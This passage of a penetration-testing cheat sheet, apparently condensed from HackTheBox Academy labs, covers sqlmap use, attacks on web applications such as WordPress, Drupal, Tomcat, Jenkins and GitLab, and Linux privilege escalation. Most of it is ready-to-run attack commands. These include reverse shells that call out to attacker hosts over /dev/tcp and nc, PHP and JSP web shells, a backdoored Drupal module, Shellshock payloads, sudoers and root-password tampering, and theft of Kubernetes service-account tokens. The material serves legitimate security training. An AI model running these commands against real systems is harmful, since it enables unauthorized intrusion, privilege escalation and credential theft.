# Basic DB enumeration
sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba

# Table enumeration
sqlmap -u "http://www.example.com/?id=1" --tables -D testdb

# Table row enumeration
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname

# Conditional enumeration
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"

# CSRF token bypass
sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=<CSRF_TOKEN>" --csrf-token="csrf-token"

# List all tamper scripts
sqlmap --list-tampers

# Writing a file
sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"

# Spawn a shell
sqlmap -u "http://www.example.com/?id=1" --os-shell
```

### Advanced SQLMap Options

```bash
# Detection and tuning
sqlmap -u "http://<TARGET>/?id=1" --level=5 --risk=3
sqlmap -u "http://<TARGET>/?id=1" --technique=BEUSTQ
sqlmap -u "http://<TARGET>/?id=1" --dbms=mysql
sqlmap -u "http://<TARGET>/?id=1" --batch --threads=10

# Request options
sqlmap -r request.txt
sqlmap -u "http://<TARGET>/?id=1" --cookie="<COOKIE_NAME>=<COOKIE_VALUE>"
sqlmap -u "http://<TARGET>/?id=1" --headers="X-Forwarded-For: 127.0.0.1"
sqlmap -u "http://<TARGET>/?id=1" --random-agent
sqlmap -u "http://<TARGET>/?id=1" --proxy=http://127.0.0.1:8080

# Enumeration
sqlmap -u "http://<TARGET>/?id=1" --dbs
sqlmap -u "http://<TARGET>/?id=1" -D <DB> --tables
sqlmap -u "http://<TARGET>/?id=1" -D <DB> -T <TABLE> --columns
sqlmap -u "http://<TARGET>/?id=1" -D <DB> -T <TABLE> --dump
sqlmap -u "http://<TARGET>/?id=1" --dump-all
sqlmap -u "http://<TARGET>/?id=1" --search -T user
sqlmap -u "http://<TARGET>/?id=1" --passwords --privileges --roles

# WAF/CSRF bypass
sqlmap -u "http://<TARGET>/?id=1" --tamper=<TAMPER_SCRIPT>
sqlmap -u "http://<TARGET>/?id=1" --randomize=<PARAM>
sqlmap -u "http://<TARGET>/?id=1" --eval="import hashlib; h=hashlib.md5(id).hexdigest()"

# OS/file access (requires DBA privileges)
sqlmap -u "http://<TARGET>/?id=1" --is-dba
sqlmap -u "http://<TARGET>/?id=1" --file-read="/etc/passwd"
sqlmap -u "http://<TARGET>/?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"
sqlmap -u "http://<TARGET>/?id=1" --os-shell
sqlmap -u "http://<TARGET>/?id=1" --os-pwn
```

Use `--batch` for automation, `-v 3` for payload visibility, and `--flush-session` after changing the target or options.

## 12. Attacking Common Web Applications

### Application Enumeration

```
- nmap -p 80,443,8000,8080,8180,8888,10000 --open -oA web_discovery -iL scope_list
- eyewitness --web -x web_discovery.xml -d inlanefreight_eyewitness
- cat web_discovery.xml | ./aquatone -nmap

```

### WordPress

```
- curl -s http://blog.inlanefreight.local | grep WordPress
- curl -s http://blog.inlanefreight.local/ | grep themes
- curl -s http://blog.inlanefreight.local/ | grep plugins
- curl -s http://blog.inlanefreight.local/?p=1 | grep plugins
- http://blog.inlanefreight.local/wp-login.php
- sudo wpscan --url http://blog.inlanefreight.local --enumerate --api-token <WPSCAN_API_TOKEN>
- wpscan --url http://blog.inlanefreight.local/
- user enum
	-  wpscan --url http://blog.inlanefreight.local --enumerate u
-  Brute force
	-  sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local
- Command injection or Code Execution
	- login with admin --> http://blog.inlanefreight.local/wp-admin/theme-editor.php?file=404.php&theme=twentynineteen
	- update file --> system($_GET[0]);
	- curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=id
- mfs
	- use exploit/unix/webapp/wp_admin_shell_upload
- Vulnerable Plugins - mail-masta
	- curl -s http://blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
- Vulnerable Plugins - wpDiscuz
	- python3 wp_discuz.py -u http://blog.inlanefreight.local -p /?p=1
- curl -s http://blog.inlanefreight.local/wp-content/uploads/2021/08/uthsdkbywoxeebg-1629904090.8191.php?cmd=id
```

### Joomla

```
- curl -s https://developer.joomla.org/stats/cms_version | python3 -m json.tool
- curl -s http://dev.inlanefreight.local/ | grep Joomla
- curl -s http://dev.inlanefreight.local/README.txt | head -n 5
- curl -s http://dev.inlanefreight.local/administrator/manifests/files/joomla.xml | xmllint --format -
- sudo pip3 install droopescan
	- droopescan scan joomla --url http://dev.inlanefreight.local/

-  python2 -m pip install bs4
	- python2 joomlascan.py -u http://dev.inlanefreight.local
	- sudo python3 joomla-brute.py -u http://dev.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin

	- curl -s http://dev.inlanefreight.local/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=id
- CVE-2019-10945
	- https://github.com/dpgg101/CVE-2019-10945
	- python2.7 joomla_dir_trav.py --url "http://dev.inlanefreight.local/administrator/" --username <USER> --password <PASSWORD> --dir /

```

### Drupal

```
- curl -s http://drupal.inlanefreight.local | grep Drupal
- curl -s http://drupal-acc.inlanefreight.local/CHANGELOG.txt | grep -m2 ""
- curl -s http://drupal.inlanefreight.local/CHANGELOG.txt
- droopescan scan drupal -u http://drupal.inlanefreight.local
- https://www.cvedetails.com/vulnerability-list/vendor_id-1367/product_id-2387/Drupal-Drupal.html

- Leveraging the PHP Filter Module
	- log in as an admin and enable the PHP filter module --> check box next to the module and scroll down to Save configuration. Next, we could go to Content --> Add content and create a Basic page.
	- create a page with a malicious PHP snippet system($_GET['cmd']);  We named the parameter with an md5 hash instead of the common cmd to get in the practice of not potentially leaving a door open to 	an attacker during our assessment.
	- set Text format drop-down to PHP code. After clicking save, we will be redirected to the new page, in this example http://drupal-qa.inlanefreight.local/node/3.
	- curl -s http://drupal-qa.inlanefreight.local/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id | grep uid | cut -f4 -d">"

- Leveraging the PHP Filter Module (version 8 )
	- wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
	- Once downloaded go to Administration > Reports > Available updates. http://drupal.inlanefreight.local/admin/reports/updates/install
	- Browse, select the file from the directory we downloaded it to, and then click Install.
	- Once the module is installed, we can click on Content and create a new basic page, similar to how we did in the Drupal 7 example. Again, be sure to select PHP code from the Text format dropdown.

- Uploading a Backdoored Module
	- Download the archive and extract its contents.
	- get --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
	- tar xvf captcha-8.x-1.2.tar.gz
	- Create a PHP web shell with the contents:
		<?php
		system($_GET['fe8edbabc5c5c9b7b764504cd22b17af']);
		?>
	- Next, we need to create a .htaccess file to give ourselves access to the folder. This is necessary as Drupal denies direct access to the /modules folder.
		<IfModule mod_rewrite.c>
		RewriteEngine On
		RewriteBase /
		</IfModule>
	- The configuration above will apply rules for the / folder when we request a file in /modules. Copy both of these files to the captcha folder and create an archive.
		- mv shell.php .htaccess captcha
		- tar cvf captcha.tar.gz captcha/
		- Assuming we have administrative access to the website, click on Manage and then Extend on the sidebar. Next, click on the + Install new module button, and we will be taken to the install page, 			such as http://drupal.inlanefreight.local/admin/modules/install Browse to the backdoored Captcha archive and click Install.
		- curl -s drupal.inlanefreight.local/modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=id

- Leveraging Known Vulnerabilities
	- Drupalgeddon
		- POC:- https://www.exploit-db.com/exploits/34992
		- python2.7 drupalgeddon.py -t http://drupal-qa.inlanefreight.local -u hacker -p <PASSWORD>
		- Now let's see if we can log in as an admin. We can! Now from here, we could obtain a shell through the various means discussed previously in this section.
		- We could also use the exploit/multi/http/drupal_drupageddon Metasploit module to exploit this.
	- Drupalgeddon2
		- POC:- https://www.exploit-db.com/exploits/44448
		- python3 drupalgeddon2.py
		- curl -s http://drupal-dev.inlanefreight.local/hello.txt
		- Now let's modify the script to gain remote code execution by uploading a malicious PHP file.
			<?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);?>
		- echo '<?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);?>' | base64
		- echo "PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K" | base64 -d | tee mrb3n.php
		- run the modified exploit script to upload our malicious PHP file.
		- python3 drupalgeddon2.py
		- curl http://drupal-dev.inlanefreight.local/mrb3n.php?fe8edbabc5c5c9b7b764504cd22b17af=id
	-Drupalgeddon3
		- POC:- https://github.com/rithchard/Drupalgeddon3
		- Drupalgeddon3 is an authenticated remote code execution vulnerability that affects multiple versions of Drupal core. It requires a user to have the ability to delete a node. We can exploit this 		using Metasploit, but we must first log in and obtain a valid session cookie.
		- Once we have the session cookie, we can set up the exploit module as follows.
			- multi/http/drupal_drupageddon3
			- set rhosts 10.129.42.195
			- set VHOST drupal-acc.inlanefreight.local
			- set drupal_session SESS<ID>=<SESSION_VALUE>
			- set DRUPAL_NODE 1
			- set LHOST 10.10.14.15
			- show options
			- exploit
			- meterpreter > getuid

```

### Tomcat

```
- gobuster dir -u http://web01.inlanefreight.local:8180/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
-  hydra -L /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt -P /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt -s 8180 app-dev.inlanefreight.local http-get /manager/html
- msf6 auxiliary(scanner/http/tomcat_mgr_login)

- WEB SHELL IN TOMCAT
	- wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
	- zip -r backup.war cmd.jsp
	# OR
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.15 LPORT=4443 -f war > backup.war
	- curl http://web01.inlanefreight.local:8180/backup/cmd.jsp?cmd=id

- Ghostcat
	- https://web.archive.org/web/20260130182638/https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi
	- python2.7 tomcat-ajp.lfi.py app-dev.inlanefreight.local -p 8009 -f WEB-INF/web.xml

```

### Splunk

```
- The Splunk web server runs by default on port 8000. On older versions of Splunk, the default credentials are <DEFAULT_CREDS>
- The Splunk Enterprise trial converts to a free version after 60 days, which doesn't require authentication
- https://github.com/0xjpuff/reverse_shell_splunk
- user@htb[/htb]$ tree splunk_shell/
	splunk_shell/
	├── bin
	└── default
- We need the .bat file, which will run when the application is deployed and execute the PowerShell one-liner.
	@ECHO OFF
	PowerShell.exe -exec bypass -w hidden -Command "& '%~dpn0.ps1'"
	Exit
- Once the files are created, we can create a tarball or .spl file.
	user@htb[/htb]$ tar -cvzf updater.tar.gz reverse_shell_splunk/
- The next step is to choose Install app from file and upload the application.
	https://10.129.201.50:8000/en-US/manager/search/apps/local
- Before uploading the malicious custom app, let's start a listener using Netcat or socat.
	user@htb[/htb]$ sudo nc -lnvp 443
```

### PRTG

```
- curl -s http://10.129.201.50:8080/index.htm -A "Mozilla/5.0 (compatible;  MSIE 7.01; Windows NT 5.0)" | grep version
- Default credentials <DEFAULT_CREDS>
- try brute force
- check CVEs for older versions
- check command injection via https://www.codewatch.org/blog/?p=453
	- Setup in the top right and then the Account Settings menu and finally click on Notifications.
	- Add new notification. -> next to EXECUTE PROGRAM. Under Program File, select Demo exe notification - outfile.ps1
	- in the parameter field, enter a command. For our purposes, we will add a new local admin user by entering test.txt;net user prtgadm1 <NEW_PASSWORD> /add;net localgroup administrators prtgadm1 /add --> Save
	- Notifications -->  see our new notification named pwn in the list. --> After clicking Test we will get a pop-up that says EXE notification is queued up.
	- Since this is a blind command execution, we need check by crackmap or impacktools
	- sudo crackmapexec smb 10.129.201.50 -u prtgadm1 -p <NEW_PASSWORD>
	- impacket-psexec APP03/prtgadm1:'<NEW_PASSWORD>'@10.129.201.50

```

### GitLab

```
- https://www.exploit-db.com/exploits/49821
	- ./gitlab_userenum.sh --url http://gitlab.inlanefreight.local:8081/ --userlist users.txt
- https://www.exploit-db.com/exploits/49951
	- python3 gitlab_13_10_2_rce.py -t http://gitlab.inlanefreight.local:8081 -u mrb3n -p <PASSWORD> -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.15 8443 >/tmp/f '
```

### CGI

```
- ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.cmd
- user@htb[/htb]$ ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.bat
- gobuster dir -u http://10.129.204.231/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi
- try command injection
	- http://10.129.204.227:8080/cgi/welcome.bat?&dir
	- http://10.129.204.227:8080/cgi/welcome.bat?&set
	- http://10.129.204.227:8080/cgi/welcome.bat?&c:\windows\system32\whoami.exe
	- http://10.129.204.227:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe

- curl -i http://10.129.204.231/cgi-bin/access.cgi
	- curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://10.129.205.27/cgi-bin/access.cgi
	- curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.15.38/7777 0>&1' http://10.129.205.27/cgi-bin/access.cgi
	- sudo nc -lvnp 7777
```

### ColdFusion

```
- nmap -p- -sC -Pn 10.129.247.30 --open --> 8500/tcp open fmtp (ColdFusion SSL default port)
- To know the version --> /CFIDE/administrator

- Attacking ColdFusion
	- searchsploit adobe coldfusion
		- Directory Traversal
			1) http://www.example.com/CFIDE/administrator/settings/mappings.cfm?locale=en OR http://www.example.com/CFIDE/administrator/settings/mappings.cfm?locale=../../../../../etc/passwd
			OR
			2) searchsploit -p 14641
				- cp /usr/share/exploitdb/exploits/multiple/remote/14641.py
				- python2 14641.py
				- python2 14641.py 10.129.204.230 8500
		- RCE
			1) http://www.example.com/index.cfm?%3B%20echo%20%22This%20server%20has%20been%20compromised%21%22%20%3E%20C%3A%5Ccompromise.txt
			OR
			2) http://www.example.com/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=
			OR
			3) searchsploit -p 50057
				- cp /usr/share/exploitdb/exploits/cfm/webapps/50057.py .
				- python3 50057.py

```

### IIS Tilde Enumeration

```
- nmap -p- -sV -sC --open 10.129.224.91 --> _http-server-header: Microsoft-IIS/7.5 which is IIS is running
- Install IIS-shortname-scanner from here https://github.com/irsdl/IIS-ShortName-Scanner , also you will find how to install oracle java https://ubuntuhandbook.org/index.php/2022/03/install-jdk-18-ubuntu/
-  java -jar iis_shortname_scanner.jar 0 5 http://10.129.204.231/
- Generate a wordlist starting with `transf`
	- egrep -r ^transf /usr/share/wordlists/* | sed 's/^[^:]*://' > /tmp/list.txt
	- gobuster dir -u http://10.129.204.231/ -w /tmp/list.txt -x .aspx,.asp

```

### LDAP

```
- nmap -p- -sC -sV --open --min-rate=1000 10.129.204.229

# ldapsearch:- ldapsearch is a command-line utility used to search for information stored in a directory using the LDAP protocol. It is commonly used to query and retrieve data from an LDAP directory service.
	- ldapsearch -H ldap://ldap.example.com:389 -D "cn=admin,dc=example,dc=com" -w <PASSWORD> -b "ou=people,dc=example,dc=com" "(mail=john.doe@example.com)"

# LDAP Injection by using * in username field OR by using * in password field
	$username = "*";
	$password = "dummy";
	(&(objectClass=user)(sAMAccountName=$username)(userPassword=$password))

# OR
	$username = "dummy";
	$password = "*";
	(&(objectClass=user)(sAMAccountName=$username)(userPassword=$password))

# OR
	$username = "*"
	$password ="*"
```

### Jenkins

```
1) Default credentials
2) Bruteforce
3) Script Console
	- http://jenkins.inlanefreight.local:8000/script
	- 		def cmd = 'id'
		def sout = new StringBuffer(), serr = new StringBuffer()
		def proc = cmd.execute()
		proc.consumeProcessOutput(sout, serr)
		proc.waitForOrKill(1000)
		println sout
	- Run

	# OR — Reverse shell

		r = Runtime.getRuntime()
		p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.15/8443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
		p.waitFor()
	- nc -lvnp 8443

	# OR — via Windows
	- Against a Windows host, we could attempt to add a user and connect to the host via RDP or WinRM or, to avoid making a change to the system, use a PowerShell download cradle with Invoke-PowerShellTcp.ps1. We could run commands on a Windows-based Jenkins install using this snippet:

	# OR — via Windows
	- https://gist.githubusercontent.com/frohoff/fed1ffaab9b9beeb1c76/raw/7cfa97c7dc65e2275abfb378101a505bfb754a95/revsh.groovy

```

### osTicket, Thick Clients, Mass Assignment & Hardening

#### osTicket

- Discover the help desk at `/osticket/`, `/support/`, or a dedicated vhost.
- Enumerate version, tickets, and exposed configuration.
- Check for default/weak admin credentials and known CVEs.
- Sensitive files: `include/ost-config.php`, database backups, email configuration.

```bash
curl -s http://<TARGET>/osticket/
curl -s http://<TARGET>/osticket/include/ost-config.php
searchsploit osticket
```

#### Thick Client Applications

- Inspect with Procmon, Process Explorer, and Strings.
- Decompile .NET/JAR clients with dnSpy, ILSpy, or JD-GUI.
- Proxy traffic with Burp/ZAP/Fiddler; check for hardcoded credentials and API keys.
- Test insecure update mechanisms, local file storage, and client-side authorization.

```cmd
strings64.exe .\client.exe
dir C:\Users\<USER>\AppData\Local\Temp
```

```bash
jar -xf client.jar
grep -R "password\|api_key\|secret" .
```

#### Web Mass Assignment

Add privileged fields to JSON/form bodies and observe whether the server accepts them:

```json
{
  "username": "user",
  "password": "<PASSWORD>",
  "email": "user@example.com",
  "is_admin": true,
  "role": "admin",
  "verified": true
}
```

Test registration, profile update, password reset, and API endpoints. Use Burp Repeater/Intruder to add fields one at a time.

#### Application Hardening

- Patch applications and remove default/example apps.
- Restrict admin interfaces by network or SSO.
- Enforce least privilege for service accounts and database users.
- Validate and allowlist mass-assignment fields.
- Disable directory listing and unnecessary HTTP methods.
- Monitor application logs and upload directories.

### Applications Connecting to Services

Many applications connect to databases, LDAP/AD, SMTP, caching, or internal APIs. These connections are often configured with reusable credentials or over-privileged accounts.

- Jenkins — LDAP/AD, SMTP, cloud credentials, build secrets.
- GitLab — PostgreSQL, Redis, SMTP, object storage.
- Tomcat — JDBC realm, JNDI resources, manager accounts.
- Splunk — LDAP, indexer connections, app secrets.
- osTicket — MySQL, SMTP, help-desk integrations.
- WordPress/Joomla/Drupal — database credentials in config files.

```bash
# Look for configuration and environment files
grep -RniE "password|passwd|secret|token|api[_-]?key" /var/www /opt /etc 2>/dev/null
find / -name "*.env" -o -name "wp-config.php" -o -name "config.php" 2>/dev/null

# Check exposed admin interfaces and default credentials
curl -s http://<TARGET>/jenkins/
curl -s http://<TARGET>/gitlab/
```

Test whether the application can reach internal services (SSRF), whether its service account is over-privileged, and whether configuration files are readable. Reuse discovered credentials only within the authorized scope.

## 13. Linux Privilege Escalation

> Condensed from HackTheBox Academy **Linux Privilege Escalation** (module 51). This is a command-oriented reference, not a copy of the course text. Lab credentials, hashes, flags, and assessment answers are intentionally omitted — replace placeholders such as `<ATTACKER_IP>`, `<TARGET>`, `<USER>`, and `<PASSWORD>` before use.

### Quick Checks

```bash
id
sudo -l
uname -a
cat /etc/os-release
hostname
ps aux
ss -tulpn

# SUID / SGID binaries
find / -perm -4000 -type f 2>/dev/null
find / -perm -6000 -type f 2>/dev/null

# Capabilities
getcap -r / 2>/dev/null

# Cron
ls -la /etc/cron* /var/spool/cron 2>/dev/null
cat /etc/crontab

# Writable files and directories
find / -path /proc -prune -o -type f -perm -o+w -print 2>/dev/null
find / -path /proc -prune -o -type d -perm -o+w -print 2>/dev/null
```

Automated helpers: [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS), [LinEnum](https://github.com/rebootuser/LinEnum), [pspy](https://github.com/DominicBreuker/pspy), [GTFOBins](https://gtfobins.github.io/).

### Information Gathering

#### Environment Enumeration

```bash
# OS, kernel, and architecture
cat /etc/os-release
uname -a
lscpu

# Current user, groups, PATH, and environment
id
echo $PATH
env
cat /etc/shells

# Users and groups
cat /etc/passwd
cat /etc/passwd | cut -f1 -d:
grep "sh$" /etc/passwd
cat /etc/group
getent group sudo
ls /home

# Disks and mounts
lsblk
cat /etc/fstab
cat /etc/fstab | grep -v "#" | column -t
df -h

# Network
ip a
route
arp -a
cat /etc/hosts

# Hidden files and directories
find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null | grep "$USER"
find / -type d -name ".*" -ls 2>/dev/null
ls -l /tmp /var/tmp /dev/shm
```

#### Services & Internals Enumeration

```bash
# Logged-in and recent users
w
lastlog

# Command history
history
find / -type f \( -name "*_hist" -o -name "*_history" \) -exec ls -l {} \; 2>/dev/null

# Scheduled tasks
ls -la /etc/cron.daily/ /etc/cron.d/ /var/spool/cron 2>/dev/null

# Processes and command lines
ps aux | grep root
find /proc -name cmdline -exec cat {} \; 2>/dev/null | tr " " "\n"

# Installed packages, binaries, and sudo version
apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' | tee -a installed_pkgs.list
ls -l /bin /usr/bin/ /usr/sbin/
sudo -V

# Interesting files
find / -type f \( -name "*.conf" -o -name "*.config" \) -exec ls -l {} \; 2>/dev/null
find / -type f -name "*.sh" 2>/dev/null | grep -v "src\|snap\|share"

# Cross-check installed binaries against GTFOBins
for i in $(curl -s https://gtfobins.org/api.json | jq -r '.executables | keys[]'); do
  if grep -q "$i" installed_pkgs.list; then echo "Check for GTFO: $i"; fi
done
```

#### Credential Hunting

```bash
# Configuration files that may contain secrets
find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null
find / -type f \( -name "*.conf" -o -name "*.config" -o -name "*.cnf" \) 2>/dev/null

# Web application configuration (example: WordPress)
grep 'DB_USER\|DB_PASSWORD' wp-config.php

# Shell history and SSH material
cat ~/.bash_history
ls -la ~/.ssh
cat ~/.ssh/known_hosts
```

Look in `/var/www`, mail spools, backups, database files, `.git` directories, and world-readable scripts. Check whether discovered credentials are reused for `su`, `sudo`, SSH, or other hosts.

### Environment-Based Privilege Escalation

#### Path Abuse

```bash
echo $PATH

# If a privileged script or cron job calls a binary by name, place a malicious
# binary earlier in PATH or in a writable PATH directory.
PATH=.:$PATH
export PATH
```

A `sudo` entry that calls a binary by a relative name (for example `cat` instead of `/bin/cat`) can also be abused this way. Check `sudo -l` for non-absolute paths.

#### Wildcard Abuse

Example: a root cron job runs `tar` with a wildcard inside a writable directory.

```bash
# Create files whose names become tar command-line options
echo 'echo "<USER> ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
echo "" > "--checkpoint-action=exec=sh root.sh"
echo "" > --checkpoint=1

# When cron runs: tar -zcf backup.tar.gz *
sudo -l
```

The same idea applies to other tools that accept options from filenames (`rsync`, `chown`, `chmod`, etc.). Inspect the scheduled command and the tool's option parser.

#### Escaping Restricted Shells

Restricted shells (`rbash`, `rksh`, `rzsh`) limit command execution, `cd`, and environment changes. Try:

```bash
# Command substitution / injection
ls -l `pwd`
$(/bin/bash)

# Chaining
; /bin/bash
| /bin/bash
&& /bin/bash
& /bin/bash

# Environment-based escapes
export PATH=/bin:/usr/bin
BASH_ENV=/bin/bash
```

Also try shell functions, editor escapes (`vi`, `vim`), pagers (`less`, `more`), and programs that can spawn a shell (`awk`, `find`, `python`, `perl`, `ruby`, `lua`).

### Permissions-Based Privilege Escalation

#### Special Permissions (SUID/SGID)

```bash
# SUID binaries owned by root
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null

# SGID binaries
find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null

# Alternative enumeration
find / -perm -u=s -type f 2>/dev/null
find / -perm -g=s -type f 2>/dev/null
```

For each result, check [GTFOBins](https://gtfobins.github.io/) for a shell or file-read technique. Example:

```bash
sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
```

#### Sudo Rights Abuse

```bash
sudo -l
```

Look for `NOPASSWD`, `SETENV`, wildcards, relative paths, and commands with dangerous options. Example: `tcpdump` with `-z postrotate-command`:

```bash
# Payload executed by tcpdump as root
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER_IP> 443 >/tmp/f' > /tmp/.test

sudo tcpdump -ln -i <INTERFACE> -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
```

Other common paths: `sudo` entries for editors, pagers, interpreters, `find`, `awk`, `tar`, `rsync`, `git`, and service restart commands. Check GTFOBins for the exact binary.

#### Privileged Groups

```bash
id
```

- **lxd** — full LXD commands are in the LXD section below.
- **docker** — equivalent to root on the host; see the Docker section.
- **disk** — raw disk access with `debugfs`:
  ```bash
  debugfs /dev/sda1
  ```
- **adm** — read logs in `/var/log`:
  ```bash
  grep -Ri "password\|passwd\|token" /var/log 2>/dev/null
  ```
- **sudo** — `sudo -l`.
- **shadow** — read `/etc/shadow` directly.

#### Capabilities

```bash
# Enumerate capabilities on common binary directories
find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
getcap -r / 2>/dev/null

# Example: cap_dac_override on vim
getcap /usr/bin/vim.basic
/usr/bin/vim.basic /etc/passwd

# Non-interactive: remove the root password field, then su without a password
echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd
su root
```

Dangerous capabilities to look for: `cap_setuid`, `cap_setgid`, `cap_sys_admin`, `cap_dac_override`, `cap_sys_ptrace`, `cap_sys_module`.

For `cap_setuid` on an interpreter:

```bash
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
perl -e 'use POSIX qw(setuid); setuid(0); exec "/bin/bash";'
```

### Service-Based Privilege Escalation

#### Vulnerable Services

```bash
# Example: Screen 4.5.0
screen -v
# Search for a public exploit/PoC for the installed version
searchsploit screen 4.5.0
```

The module's Screen exploit overwrites `/etc/ld.so.preload` to load a malicious shared object as root. Only run public exploits after understanding their impact; they can crash the target.

#### Cron Job Abuse

```bash
# Find world-writable files (candidate cron scripts)
find / -path /proc -prune -o -type f -perm -o+w -print 2>/dev/null

# Inspect the script and its schedule
ls -la /dmz-backups/
cat /dmz-backups/backup.sh
cat /etc/crontab
ls -la /etc/cron.d/ /etc/cron.daily/

# Watch processes and file-system events without root
./pspy64 -pf -i 1000
```

If a root-owned cron script is writable, append a reverse shell (keep the original script working first):

```bash
echo 'bash -i >& /dev/tcp/<ATTACKER_IP>/443 0>&1' >> /path/to/backup.sh
nc -lvnp 443
```

#### LXD

```bash
id    # confirm membership in the lxd group

lxd init
lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine
lxc init alpine r00t -c security.privileged=true
lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true
lxc start r00t
lxc exec r00t /bin/sh
```

Inside the container, the host filesystem is mounted under `/mnt/root`.

#### Docker

```bash
id
docker image ls

# docker group: mount the host root filesystem
docker run -v /root:/mnt -it ubuntu

# Writable Docker socket on the host
docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash
```

Inside a container with a writable Docker socket and the `docker` client:

```bash
ls -al /app/docker.sock
/tmp/docker -H unix:///app/docker.sock ps
/tmp/docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem main_app
/tmp/docker -H unix:///app/docker.sock exec -it <CONTAINER_ID> /bin/bash
```

#### Kubernetes

```bash
# API server and Kubelet discovery
curl https://<K8S_API>:6443 -k
curl https://<KUBELET>:10250/pods -k | jq .

# kubeletctl enumeration and RCE
kubeletctl -i --server <KUBELET> pods
kubeletctl -i --server <KUBELET> scan rce
kubeletctl -i --server <KUBELET> exec "id" -p <POD> -c <CONTAINER>

# Extract the service-account token and CA certificate
kubeletctl -i --server <KUBELET> exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p <POD> -c <CONTAINER> | tee -a k8.token
kubeletctl --server <KUBELET> exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p <POD> -c <CONTAINER> | tee -a ca.crt

# Check permissions with the stolen token
export token=`cat k8.token`
kubectl --token=$token --certificate-authority=ca.crt --server=https://<K8S_API>:6443 auth can-i --list
```

If the token can create pods, deploy a privileged pod that mounts the host root:

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: privesc
  namespace: default
spec:
  containers:
  - name: privesc
    image: nginx:1.14.2
    volumeMounts:
    - mountPath: /root
      name: mount-root-into-mnt
  volumes:
  - name: mount-root-into-mnt
    hostPath:
       path: /
  automountServiceAccountToken: true
  hostNetwork: true
```

```bash
kubectl --token=$token --certificate-authority=ca.crt --server=https://<K8S_API>:6443 apply -f privesc.yaml
kubectl --token=$token --certificate-authority=ca.crt --server=https://<K8S_API>:6443 get pods
```

#### Logrotate

Requirements: write access to a log file, `logrotate` running as root, and a vulnerable version (for example 3.8.6, 3.11.0, 3.15.0, 3.18.0).

```bash
grep "create\|compress" /etc/logrotate.conf | grep -v "#"

git clone https://github.com/whotwagner/logrotten.git
cd logrotten
gcc logrotten.c -o logrotten

echo 'bash -i >& /dev/tcp/<ATTACKER_IP>/9001 0>&1' > payload
./logrotten -p ./payload /tmp/tmp.log
```

```bash
nc -nlvp 9001
```

#### Miscellaneous Techniques

Passive traffic capture:

```bash
sudo tcpdump -i any -A -s 0
# Analyze a capture with net-creds or PCredz
```

Weak NFS exports (`no_root_squash`):

```bash
showmount -e <TARGET>
cat /etc/exports

# On the attack host: build a SUID shell and place it on the export
cat > shell.c <<'EOF'
#include <stdio.h>
#include <unistd.h>
int main(void) { setuid(0); setgid(0); system("/bin/bash"); }
EOF
gcc shell.c -o shell

